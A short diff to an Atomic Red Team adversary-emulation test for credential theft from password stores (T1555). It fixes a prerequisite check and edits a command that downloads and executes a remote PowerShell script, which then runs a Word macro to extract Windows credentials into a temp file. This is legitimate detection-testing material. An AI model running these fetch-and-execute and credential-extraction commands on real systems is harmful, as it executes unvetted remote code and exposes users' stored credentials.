@@ -15,6 +15,7 @@ atomic_tests:
     prereq_command: |
       try {
         New-Object -COMObject "word.Application" | Out-Null
+        $process = "winword"
         Stop-Process -Name $process
         exit 0
       } catch { exit 1 }
@@ -22,7 +23,7 @@ atomic_tests:
       Write-Host "You will need to install Microsoft Word manually to meet this requirement"
   executor:
     command: |
-      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
       Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1555\src\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"
     cleanup_command: |
       Remove-Item "$env:TEMP\windows-credentials.txt" -ErrorAction Ignore
